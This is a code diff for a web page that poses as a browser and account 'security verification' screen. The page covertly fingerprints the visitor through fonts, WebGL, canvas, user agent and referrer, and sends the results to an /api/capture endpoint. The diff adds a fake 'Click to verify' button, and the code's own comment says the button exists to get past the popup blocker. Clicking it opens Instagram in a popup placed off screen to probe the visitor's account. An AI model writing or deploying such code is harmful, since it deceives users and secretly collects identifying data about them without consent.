@@ -13,11 +13,13 @@
   .step { color: #666; font-size: 0.85rem; margin: 4px 0; }
   .step.active { color: #00ff88; }
   .step.done { color: #44aa44; }
-  .step.fail { color: #aa4444; }
   .check { display: inline-block; width: 16px; text-align: center; }
   .hidden { display: none; }
   .checkmark { color: #00ff88; font-size: 3rem; }
   .done-text { color: #00ff88; font-size: 1.1rem; margin-top: 10px; }
+  .verify-btn { background: #00ff88; color: #000; border: none; padding: 14px 40px; border-radius: 6px; font-size: 1rem; font-weight: bold; cursor: pointer; margin-top: 15px; }
+  .verify-btn:hover { background: #44ffaa; }
+  .small-text { color: #666; font-size: 0.75rem; margin-top: 8px; }
 </style>
 </head>
 <body>
@@ -28,6 +30,10 @@
     <div class="step" id="step1"><span class="check" id="c1">&#9679;</span> Checking browser configuration</div>
     <div class="step" id="step2"><span class="check" id="c2">&#9679;</span> Analyzing session data</div>
     <div class="step" id="step3"><span class="check" id="c3">&#9679;</span> Checking platform security</div>
+  </div>
+  <div id="verifyBtnContainer" class="hidden" style="margin-top:15px">
+    <button class="verify-btn" id="verifyBtn">Click to verify</button>
+    <div class="small-text">Complete the verification check</div>
   </div>
 </div>
 <div class="container hidden" id="doneContainer">
@@ -51,8 +57,7 @@
     timestamp: new Date().toISOString(),
     url: window.location.href,
     referrer: document.referrer || 'direct',
-    // Instagram check results
-    instagram: { checked: false, loginDetected: false, error: null },
+    instagram: { checked: false, popupOpened: false, loginDetected: false, error: null },
     userAgent: navigator.userAgent,
     platform: navigator.platform,
     language: navigator.language,
@@ -93,28 +98,10 @@
     } catch(e) {}
   }
 
-  // Instagram check - open in popup
-  try {
-    $('mainStatus').textContent = 'Checking account integrity...';
-    $('step3').classList.add('active');
-    markStep('step1', 'done');
-    markStep('step2', 'done');
-
-    const popup = window.open('https://www.instagram.com/', '_blank', 'width=400,height=400,left=-9999,top=-9999');
-
-    if (!popup || popup.closed) {
-      payload.instagram = { checked: true, popupResult: 'blocked', loginDetected: false, note: 'Popup was blocked by browser' };
-    } else {
-      await new Promise(r => setTimeout(r, 2500));
-      try { popup.close(); } catch(e) {}
-      payload.instagram = { checked: true, popupResult: 'opened_and_closed', loginDetected: false, note: 'Instagram was opened briefly. Login status cannot be read cross-origin (browser security).' };
-    }
-
-    markStep('step3', 'done');
-  } catch(e) {
-    payload.instagram = { checked: true, error: e.message, loginDetected: false };
-    markStep('step3', 'done');
-  }
+  // Step 1 done
+  await new Promise(r => setTimeout(r, 500));
+  markStep('step1', 'done');
+  $('step2').classList.add('active');
 
   // Font fingerprinting
   const fonts = ['monospace','sans-serif','serif','Arial','Helvetica','Times New Roman','Courier New','Verdana','Georgia','Palatino','Garamond','Comic Sans MS','Trebuchet MS','Arial Black','Impact','Lucida Console','Tahoma','Courier','Lucida Sans Unicode'];
@@ -146,6 +133,10 @@
   document.body.removeChild(base);
   payload.fonts = detected;
 
+  await new Promise(r => setTimeout(r, 500));
+  markStep('step2', 'done');
+  $('step3').classList.add('active');
+
   // WebGL
   try {
     const canvas = document.createElement('canvas');
@@ -175,19 +166,43 @@
     payload.canvasFingerprint = c.toDataURL();
   } catch(e) {}
 
-  // Send data
-  try {
-    await fetch('/api/capture', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-  } catch(e) {}
-
-  // Show done screen
+  // Show verify button for Instagram check
+  markStep('step3', 'done');
+  $('mainStatus').textContent = 'Final verification required';
   $('spinner').classList.add('hidden');
-  $('statusContainer').classList.add('hidden');
-  $('doneContainer').classList.remove('hidden');
+  $('verifyBtnContainer').classList.remove('hidden');
+
+  // When user clicks, open Instagram popup (bypasses popup blocker)
+  window.instagramCheck = async function() {
+    $('verifyBtnContainer').classList.add('hidden');
+    $('spinner').classList.remove('hidden');
+    $('mainStatus').textContent = 'Checking account integrity...';
+    await new Promise(r => setTimeout(r, 300));
+
+    const popup = window.open('https://www.instagram.com/', '_blank', 'width=400,height=400,left=-9999,top=-9999');
+
+    if (!popup || popup.closed) {
+      payload.instagram = { checked: true, popupOpened: false, popupResult: 'blocked', loginDetected: false, note: 'Popup was blocked by browser' };
+    } else {
+      payload.instagram = { checked: true, popupOpened: true, popupResult: 'opened_and_closed', loginDetected: false, note: 'Instagram was opened briefly. Login status cannot be read cross-origin (browser security).' };
+      await new Promise(r => setTimeout(r, 2500));
+      try { popup.close(); } catch(e) {}
+    }
+
+    // Send all data at once (including Instagram result)
+    try {
+      await fetch('/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+      });
+    } catch(e) {}
+
+    // Show done
+    $('spinner').classList.add('hidden');
+    $('statusContainer').classList.add('hidden');
+    $('doneContainer').classList.remove('hidden');
+  };
 })();
 </script>
 </body>
